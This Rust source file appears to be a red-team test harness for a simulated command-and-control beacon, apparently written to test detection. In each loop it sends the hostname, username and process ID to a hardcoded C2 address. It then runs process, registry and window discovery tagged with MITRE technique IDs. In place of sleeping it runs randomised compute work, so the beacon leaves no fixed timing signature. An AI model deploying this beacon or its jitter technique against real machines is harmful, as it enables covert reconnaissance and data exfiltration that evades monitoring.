// busywork/src/main.rs
// Test-2: BusyWork beacon — same discovery pattern as baseline_sleep
//         but Sleep() replaced with busywork_with(compute+memory only)
// Story: TID-5889 | ISSP-5507
// Compile: cargo build --release
// Run:     .\target\release\busywork.exe medium 20
//
// Why busywork_with instead of busywork:
//   - Restricts dwell work to COMPUTE+MEMORY only
//   - Avoids cat-network (DNS/HTTP calls would muddy the C2 traffic signal)
//   - Avoids cat-winapi/cat-registry in dwell (we do those explicitly as beacon behavior)
//   - Jitter is built-in: each task gets ±30% randomised parameters
//   - 2.5M+ possible task combinations at Medium — no fixed timing signature

use std::io::Write;
use std::net::TcpStream;
use std::time::Instant;
use busywork::{busywork_with, Categories, Intensity};

#[cfg(windows)]
use winapi::{
    shared::minwindef::{BOOL, DWORD, LPARAM},
    shared::windef::HWND,
    um::{
        handleapi::CloseHandle,
        tlhelp32::{
            CreateToolhelp32Snapshot, Process32First, Process32Next,
            PROCESSENTRY32, TH32CS_SNAPPROCESS,
        },
        winnt::KEY_READ,
        winreg::{
            RegCloseKey, RegOpenKeyExA, RegQueryValueExA, HKEY_LOCAL_MACHINE,
        },
        winuser::EnumWindows,
    },
};

const C2_HOST: &str = "10.110.0.106:8080";
const ITERATIONS: u32 = 20;

// ── beacon behavior (same as T1 baseline) ─────────────────────────────────────

fn get_hostname() -> String {
    std::env::var("COMPUTERNAME").unwrap_or_else(|_| "UNKNOWN".to_string())
}

fn simulate_checkin(iter: u32) {
    match TcpStream::connect(C2_HOST) {
        Ok(mut stream) => {
            let hostname = get_hostname();
            let payload = format!(
                "[beacon] iter={} | host={} | user={} | pid={}\n\
                 [recon]  processes=enumerated | registry=queried | windows=enumerated\n\
                 [status] dwell=busywork(compute+memory) | sleep=none\n\
                 ---\n",
                iter,
                hostname,
                std::env::var("USERNAME").unwrap_or_else(|_| "UNKNOWN".to_string()),
                std::process::id(),
            );
            let _ = stream.write_all(payload.as_bytes());
            println!("  [checkin] iter={} connected — payload sent", iter);
        }
        Err(_) => println!("  [checkin] iter={} no listener", iter),
    }
}

#[cfg(windows)]
fn enum_processes() {
    unsafe {
        let snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        let mut pe: PROCESSENTRY32 = std::mem::zeroed();
        pe.dwSize = std::mem::size_of::<PROCESSENTRY32>() as DWORD;
        if Process32First(snap, &mut pe) != 0 {
            while Process32Next(snap, &mut pe) != 0 {}
        }
        CloseHandle(snap);
    }
}

#[cfg(windows)]
fn query_registry() {
    unsafe {
        let mut hkey = std::ptr::null_mut();
        RegOpenKeyExA(
            HKEY_LOCAL_MACHINE,
            b"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\0".as_ptr() as *const i8,
            0, KEY_READ, &mut hkey,
        );
        let mut buf = [0u8; 256];
        let mut sz: DWORD = 256;
        RegQueryValueExA(
            hkey,
            b"ProductName\0".as_ptr() as *const i8,
            std::ptr::null_mut(), std::ptr::null_mut(),
            buf.as_mut_ptr(), &mut sz,
        );
        RegCloseKey(hkey);

        RegOpenKeyExA(
            HKEY_LOCAL_MACHINE,
            b"SYSTEM\\CurrentControlSet\\Services\0".as_ptr() as *const i8,
            0, KEY_READ, &mut hkey,
        );
        RegCloseKey(hkey);
    }
}

#[cfg(windows)]
unsafe extern "system" fn wnd_enum_proc(_hwnd: HWND, _lparam: LPARAM) -> BOOL { 1 }

#[cfg(windows)]
fn enum_windows_check() {
    unsafe { EnumWindows(Some(wnd_enum_proc), 0); }
}

// ── main ──────────────────────────────────────────────────────────────────────

fn main() {
    let args: Vec<String> = std::env::args().collect();
    let level = args.get(1).map(|s| s.as_str()).unwrap_or("medium");
    let loops: u32 = args.get(2)
        .and_then(|s| s.parse().ok())
        .unwrap_or(ITERATIONS);

    let intensity = match level {
        "low"   => Intensity::Low,
        "high"  => Intensity::High,
        "ultra" => Intensity::Ultra,
        _       => Intensity::Medium,
    };

    // Dwell categories: compute + memory only
    // No network (avoids DNS/HTTP noise), no winapi/registry (we call those explicitly)
    let dwell_cats = Categories::COMPUTE | Categories::MEMORY;

    println!("[bw-harness] host={} level={} iters={}", C2_HOST, level, loops);

    for i in 0..loops {
        let t = Instant::now();

        // 1. checkin
        simulate_checkin(i);

        // 2. discovery (mirrors T1 baseline behavior)
        #[cfg(windows)]
        {
            enum_processes();   // T1057 — Process Discovery
            query_registry();   // T1012 — Query Registry
            enum_windows_check(); // T1082 — System Info
        }

        // 3. dwell — busywork replaces Sleep()
        //    compute+memory only; jitter built-in (±30% per task parameter)
        busywork_with(intensity, dwell_cats);

        println!("  iter {}: {} ms", i, t.elapsed().as_millis());
    }
}
